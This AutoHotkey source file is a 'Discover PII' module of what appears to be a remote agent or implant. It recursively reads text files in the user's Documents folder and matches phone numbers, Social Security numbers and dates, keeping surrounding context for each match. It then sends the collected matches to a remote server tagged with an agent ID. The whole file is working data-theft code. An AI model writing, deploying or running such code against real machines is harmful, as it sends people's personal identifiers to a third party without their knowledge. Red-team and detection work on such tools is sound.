; ============================================================================
; DISCOVER PII MODULE
; ============================================================================
; Scans text files for personally identifiable information patterns
; Detects: phone numbers, SSN, dates
; ============================================================================

DiscoverPII(documentsPath := "") {
    if (documentsPath = "")
        documentsPath := A_MyDocuments
    contextLength := 30
    this.log("Starting document scan in: " documentsPath)
    results := []

    ; Regex patterns
    Regex1 := "\(?\d{3}\)?[ .-]\d{3}[ .-]\d{4}"
    Regex2 := "\b\d{3}-\d{2}-\d{4}\b"
    Regex3 := "\b(?:\d{1,2}[-/]\d{1,2}[-/]\d{2,4}|\d{4}[-/]\d{1,2}[-/]\d{1,2})\b"

    fileList := []
    Loop Files, documentsPath "\*.txt", "R"
    {
        fileList.Push(A_LoopFilePath)
    }

    this.log("Found " fileList.Length " text files to scan")

    if fileList.Length = 0 {
        this.log("No files found - ending scan")
        message := Format("command_output|{}|No text files found in directory.", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        return results
    }

    for filePath in fileList
    {
        this.log("Scanning file: " filePath)
        try
        {
            fileContent := FileRead(filePath)
            this.log("Successfully read file content")
        }
        catch as err
        {
            this.log("Failed to read file: " err.Message)
            continue
        }

        patterns := [Regex1, Regex2, Regex3]
        for pattern in patterns
        {
            this.log("Applying pattern: " pattern)
            fileResults := FindContext(fileContent, pattern, contextLength)
            if (fileResults.Length > 0)
            {
                this.log("Found " fileResults.Length " matches")
                results.Push({
                    file: filePath,
                    matches: fileResults
                })
            }
        }
    }

    ; Compile results into a single string if matches were found
    combinedOutput := ""
    if (results.Length > 0) {
        this.log("Compiling final output")
        for fileResult in results {
            combinedOutput .= "File: " fileResult.file "`r`n"
            for match in fileResult.matches {
                combinedOutput .= "Match: " match.match "`r`nBefore: " match.beforeContext "`r`nAfter: " match.afterContext "`r`n"
            }
            combinedOutput .= "`r`n"
        }
        this.log("Output compilation complete")
    }

    this.log("Scan complete - found matches in " results.Length " files of " fileList.Length " files scanned.")

    this.Log(combinedOutput)
    if not (combinedOutput = ""){
        message := Format("command_output|{}|{}", this.agentID, combinedOutput)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }
    return results

    FindContext(content, pattern, length) {
        resultArray := []
        startPos := 1

        while (foundPos := RegExMatch(content, pattern, &match, startPos))
        {
            matchStr := match[]

            ; Get context before the match
            beforeStart := Max(1, foundPos - length)
            beforeLength := foundPos - beforeStart
            beforeContext := SubStr(content, beforeStart, beforeLength)

            ; Get context after the match
            afterStart := foundPos + StrLen(matchStr)
            afterContext := SubStr(content, afterStart, length)

            resultArray.Push({
                match: matchStr,
                beforeContext: beforeContext,
                afterContext: afterContext
            })
            startPos := afterStart
        }

        return resultArray
    }
}
